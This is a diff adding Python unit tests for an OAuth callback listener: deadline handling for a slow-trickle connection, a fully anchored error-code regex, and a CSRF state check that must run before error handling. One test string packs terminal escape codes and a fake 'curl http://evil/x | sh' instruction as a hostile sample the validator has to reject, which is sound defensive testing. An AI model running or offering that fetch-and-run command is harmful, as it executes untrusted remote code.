@@ -1,5 +1,7 @@
 """Tests for the OAuth callback listener. Standard library only."""
 
+import contextlib
+import io
 import os
 import socket
 import sys
@@ -216,3 +218,172 @@ class ParseRedirectTest(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class DribblingConnectionTest(unittest.TestCase):
+    """A slow trickle must not outlast the wall-clock deadline either.
+
+    CALLBACK_READ_TIMEOUT bounds one recv, and every byte received resets it.
+    A peer sending one byte per second therefore held handle_request open for
+    as long as it liked: measured at 26s against a 300s CALLBACK_TIMEOUT, it
+    never returned. SilentConnectionTest cannot see this - it sends nothing,
+    which the per-read timeout does close.
+    """
+
+    def test_a_dribbling_socket_does_not_outlast_the_deadline(self):
+        port = _free_port()
+        server = auth._CallbackServer(("127.0.0.1", port), auth._CallbackHandler)
+        self.addCleanup(server.server_close)
+        server.callback_path = "/callback"
+        server.auth_code = None
+        server.auth_error = None
+        server.returned_state = None
+        server.timeout = 0.2
+
+        stop = threading.Event()
+        self.addCleanup(stop.set)
+
+        def dribble():
+            with socket.create_connection(("127.0.0.1", port), timeout=5) as sock:
+                # Never a newline, so rfile.readline() cannot return on its own.
+                while not stop.is_set():
+                    try:
+                        sock.sendall(b"G")
+                    except OSError:
+                        return
+                    stop.wait(0.25)
+
+        trickler = threading.Thread(target=dribble, daemon=True)
+        trickler.start()
+
+        deadline = 1.0
+        budget = deadline + auth.CALLBACK_CONNECTION_TIMEOUT + 5
+        result = {}
+
+        def run():
+            start = time.monotonic()
+            try:
+                auth.wait_for_callback(server, timeout=deadline)
+            except BaseException as exc:  # noqa: BLE001 - recorded, not swallowed
+                result["raised"] = exc
+            result["elapsed"] = time.monotonic() - start
+
+        worker = threading.Thread(target=run, daemon=True)
+        worker.start()
+        worker.join(timeout=budget + 10)
+
+        self.assertFalse(
+            worker.is_alive(),
+            "wait_for_callback is still blocked: the dribbling connection is "
+            "resetting the read timeout forever",
+        )
+        self.assertIsInstance(result.get("raised"), SystemExit)
+        self.assertIn("no Xero callback arrived", str(result["raised"]))
+        self.assertLess(result["elapsed"], budget)
+
+    def test_the_connection_budget_does_not_reset_on_a_byte(self):
+        """The point of the second timeout: it is absolute, not per-read."""
+        self.assertGreater(
+            auth.CALLBACK_CONNECTION_TIMEOUT, auth.CALLBACK_READ_TIMEOUT
+        )
+        self.assertLess(auth.CALLBACK_CONNECTION_TIMEOUT, auth.CALLBACK_TIMEOUT)
+
+
+class ErrorCodeGrammarTest(unittest.TestCase):
+    """The regex has to be anchored at BOTH ends.
+
+    Nothing held it to fullmatch, so a regression to re.match kept all the
+    tests green while letting an attacker-supplied error parameter write raw
+    escape sequences and fake instructions to the terminal.
+    """
+
+    HOSTILE = "access_denied\x1b[2J\nWARNING: run: curl http://evil/x | sh"
+
+    def test_a_trailing_payload_is_refused(self):
+        self.assertIsNone(auth.ERROR_CODE.fullmatch(self.HOSTILE))
+        # And this is why the anchor matters: the unanchored form accepts it.
+        self.assertIsNotNone(auth.ERROR_CODE.match(self.HOSTILE))
+
+    def test_a_leading_payload_is_refused(self):
+        self.assertIsNone(auth.ERROR_CODE.fullmatch("\x1b[2Jaccess_denied"))
+
+    def test_a_real_error_code_is_accepted(self):
+        for code in ("access_denied", "invalid_scope", "server_error", "A1_b2"):
+            with self.subTest(code=code):
+                self.assertIsNotNone(auth.ERROR_CODE.fullmatch(code))
+
+    def test_the_module_uses_the_anchored_form(self):
+        """Read the source: an unanchored .match on the error code is the
+        regression this class exists to catch, and only fullmatch is safe."""
+        source = _auth_source()
+        self.assertIn("ERROR_CODE.fullmatch(server.auth_error)", source)
+        self.assertNotIn("ERROR_CODE.match(server.auth_error)", source)
+
+
+class CallbackOrderingTest(unittest.TestCase):
+    """The CSRF check has to run BEFORE the error branch.
+
+    Nothing held the order, so moving the state comparison below the error
+    block left all 34 tests green while an unauthenticated callback got to
+    drive the error message.
+    """
+
+    def test_state_is_compared_before_the_error_is_read(self):
+        source = _auth_source()
+        state_at = source.index("server.returned_state != state")
+        error_at = source.index("if server.auth_error")
+        self.assertLess(
+            state_at,
+            error_at,
+            "the state comparison must come first: a callback carrying "
+            "error=<attacker text> is otherwise acted on before the CSRF check",
+        )
+
+    def test_a_forged_state_beats_the_error_branch(self):
+        """Behavioural half of the same claim, run against main().
+
+        The callback values are set from inside the wait_for_callback stand-in,
+        not as class attributes on the fake server: main() assigns auth_code,
+        auth_error and returned_state to None right after constructing the
+        server, so a fake carrying them up front has them wiped before the
+        branch under test ever runs - and the test passed under the reorder it
+        exists to catch. Setting them where the real callback would leaves the
+        error live at the point the ordering decides which branch wins.
+        """
+        env = {
+            "XERO_CLIENT_ID": "id-not-a-secret",
+            "XERO_CLIENT_SECRET": "secret-not-used",
+            "XERO_REDIRECT_URI": "http://localhost:8400/callback",
+        }
+        posted = {}
+
+        class _Server:
+            def __init__(self, *a, **kw):
+                pass
+
+            def server_close(self):
+                pass
+
+        def land_a_forged_callback(server, *a, **kw):
+            server.auth_code = None
+            server.auth_error = "access_denied"
+            server.returned_state = "forged-not-ours"
+
+        with mock.patch.dict(os.environ, env, clear=True), \
+                mock.patch.object(auth, "_CallbackServer", _Server), \
+                mock.patch.object(auth, "wait_for_callback", land_a_forged_callback), \
+                mock.patch.object(auth.webbrowser, "open", lambda *a, **kw: True), \
+                mock.patch.object(
+                    auth.requests, "post",
+                    lambda *a, **kw: posted.setdefault("called", True)):
+            with self.assertRaises(SystemExit) as ctx,                     contextlib.redirect_stdout(io.StringIO()):
+                auth.main()
+
+        self.assertIn("State mismatch", str(ctx.exception))
+        self.assertNotIn("access_denied", str(ctx.exception))
+        self.assertEqual(posted, {}, "no token exchange may happen on a bad state")
+
+
+def _auth_source() -> str:
+    with open(auth.__file__, encoding="utf-8") as handle:
+        return handle.read()
